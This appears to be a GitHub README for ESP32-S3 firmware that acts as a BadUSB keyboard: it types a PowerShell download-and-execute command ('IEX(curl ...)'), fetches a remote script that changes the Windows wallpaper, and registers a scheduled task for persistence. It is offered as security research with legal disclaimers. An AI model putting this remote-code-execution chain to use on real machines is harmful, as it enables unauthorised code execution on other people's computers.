# T-Dongle-S3_Desktop_Modifier

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/Platform-ESP32--S3-brightgreen)](https://www.espressif.com/)

> **Security Research & Educational Project** - Proof-of-concept firmware for USB HID attacks and penetration testing

Firmware for the **LilyGo T-Dongle-S3** (ESP32-S3) that emulates a USB HID keyboard and launches a PowerShell script to modify the desktop wallpaper on Windows. This is an educational security research project demonstrating vulnerabilities in systems that are not protected against BadUSB attacks.

---

## ⚠️ Legal Disclaimer

**WARNING: This project is for educational and research purposes only.**

- ✋ **DO NOT** use this on computers you do not own or without the **explicit permission** of the owner
- ⚖️ Unauthorized use may violate computer crime laws
- 🔒 Test **ONLY** in isolated environments (VMs, sandboxes, or lab machines)
- 📋 Use only for **educational purposes and authorized penetration testing**

---

## 📋 Features

✅ Emulation of a USB HID keyboard (virtual keyboard)
✅ Automatic execution of PowerShell commands
✅ Download and execution of remote scripts
✅ Modification of Windows desktop wallpaper
✅ EEPROM configuration & persistence
✅ Modular and easily customizable code

---

## 🛠️ Hardware Requirements

- **LilyGo T-Dongle-S3** (ESP32-S3 development board)
- **USB Type-C** cable (for flashing and power)
- Windows 10/11 computer (target for testing)
- Isolated test environment (VM recommended)

## 📦 Software Requirements

- **PlatformIO** (VS Code extension or CLI)
- USB drivers for LilyGo T-Dongle-S3
- **Python 3.x** (for PlatformIO builds)
- **Git** (to clone the repository)

---

## 📁 Repository Structure

```
T-Dongle-S3_Desktop_Modifier/
├── src/
│   └── main.cpp                    # ESP32-S3 firmware (HID keyboard emulator)
├── scripts/
│   ├── bootstrap.ps1               # Entry point dello script
│   ├── Set-Wallpaper.ps1           # Modifica lo sfondo
│   ├── Register-WallpaperTask.ps1  # Registra task persistente
│   └── ...
├── platformio.ini                  # PlatformIO configuration
├── README_it.md                    # Italian README
├── README.md                       # This file
└── LICENSE                         # MIT License
```

---

## 🚀 How It Works

### Execution Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. Power on the T-Dongle-S3 and connect it via USB              │
├─────────────────────────────────────────────────────────────────┤
│ 2. The device is recognized as a USB keyboard                    │
├─────────────────────────────────────────────────────────────────┤
│ 3. Firmware emulates: Win + R (opens "Run")                      │
├─────────────────────────────────────────────────────────────────┤
│ 4. Sends a PowerShell command via virtual keystrokes             │
│    Example: powershell -Command "IEX(curl... )"                │
├─────────────────────────────────────────────────────────────────┤
│ 5. PowerShell downloads bootstrap.ps1 from GitHub                │
├─────────────────────────────────────────────────────────────────┤
│ 6. The script executes:                                           │
│    - Set-Wallpaper.ps1 (changes the wallpaper)                   │
│    - Register-WallpaperTask.ps1 (makes it persistent)            │
└─────────────────────────────────────────────────────────────────┘
```

### Technical Details

- Firmware source: `src/main.cpp`
- The PowerShell payload URL is defined in the `URL` constant
- All PowerShell scripts are located in the `scripts/` folder
- For safety, **YOU MUST** customize the URL before using the device

---

## 🚀 Quick Start

### 1. Clone the Repository

```bash
git clone https://github.com/Gory-git/T-Dongle-S3_Desktop_Modifier.git
cd T-Dongle-S3_Desktop_Modifier
```

### 2. Install PlatformIO

**Via VS Code (recommended):**
- Install the **PlatformIO IDE** extension from the VS Code Marketplace
- Restart VS Code

**Via CLI:**

```bash
pip install platformio
```

### 3. Modify the Payload (IMPORTANT!)

Open `src/main.cpp` and modify the `URL` constant to point to your test script:

```cpp
const char* URL = "https://your-domain.com/your-script.ps1";
```

**For initial testing**, point to a local or otherwise controlled test script.

### 4. Build the Firmware

**With VS Code:**
- Click `PlatformIO` in the sidebar
- Select `Build`

**With CLI:**

```bash
pio run
```

### 5. Upload the Firmware

**With VS Code:**
- Click `Upload` (with the board connected via USB)

**With CLI:**

```bash
pio run -t upload
```

### 6. Test in an Isolated Environment

- Use a **Windows VM** with snapshots enabled
- Disconnect the network or use an isolated VLAN
- Connect the T-Dongle-S3
- Observe the behavior

---

## ⚙️ Customization

### Change the PowerShell command

Modify `src/main.cpp`:

```cpp
const char* URL = "https://your-server.com/your-script.ps1";
const char* COMMAND = "powershell -Command \"IEX(curl -Uri '" + URL + "')\"";
```

### Host Scripts Locally

For quick tests without Internet:

```bash
# Start a local web server
python -m http.server 8000

# Set the URL in main.cpp to:
const char* URL = "http://192.168.X.X:8000/bootstrap.ps1";
```

### Add Delays

If you need extra delay between key events (useful for slow systems):

```cpp
delay(100);  // Increase delay between keystrokes (milliseconds)
```

---

## 🔒 Security and Best Practices

### ✅ How to test safely

1. **Use a Windows VM**
   ```
   VirtualBox / VMware / Hyper-V
   → Create a snapshot before testing
   → Restore snapshot if needed
   ```

2. **Isolate the network**
   ```
   - Disconnect the VM network
   - Or use an isolated VLAN
   - Or use a local firewall
   ```

3. **Review the PowerShell script first**
   ```powershell
   # Run the script manually to inspect behavior
   . .\scripts\bootstrap.ps1
   ```

4. **Use antivirus during testing**
   ```
   - Enable Windows Defender
   - Check Windows Event Viewer logs
   - Monitor system changes
   ```

### ❌ What NOT to do

- Do not use on other people's computers without explicit permission
- Do not distribute the firmware online
- Do not use for intrusion or harmful purposes
- Do not test on production networks

---

## 🐛 Troubleshooting

| Problem | Solution |
|--------:|:--------|
| **Firmware won't upload** | Check USB drivers; try PlatformIO CLI |
| **Keyboard not recognized** | Reboot the system or check USB configuration in platformio.ini |
| **PowerShell script doesn't run** | Ensure the URL is reachable and PowerShell execution policy allows it |
| **Compilation errors** | Ensure PlatformIO board packages are installed: `pio boards | grep esp32-s3` |

---

## 📚 Useful Resources

- [LilyGo T-Dongle-S3 Documentation](https://github.com/Xinyuan-LilyGO/T-Dongle-S3)
- [ESP32-S3 USB Device Documentation](https://docs.espressif.com/projects/esp-idf/en/latest/)
- [PlatformIO Documentation](https://docs.platformio.org/)
- [USB HID Specification](https://www.usb.org/hid)
- [PowerShell Security Best Practices](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)

---

## 🎓 Learning Outcomes

This project teaches:

- ✏️ **USB HID Protocol** - How to emulate a USB keyboard
- 💻 **Embedded Systems** - Programming the ESP32-S3 with PlatformIO
- 🔐 **Security Research** - BadUSB attacks and mitigations
- 📜 **PowerShell Automation** - Script automation on Windows
- ⚠️ **Responsible Disclosure** - Importance of ethics in security research

---

## 📝 License

This repository is released under the **MIT License**.
See the [LICENSE](LICENSE) file for full details.

---

## 💬 Support & Questions

- 📧 **Issues**: Open an [issue on GitHub](https://github.com/Gory-git/T-Dongle-S3_Desktop_Modifier/issues)
- 💡 **Discussions**: Use [GitHub Discussions](https://github.com/Gory-git/T-Dongle-S3_Desktop_Modifier/discussions)
- 🔒 **Security**: If you discover vulnerabilities, contact me directly instead of opening a public issue
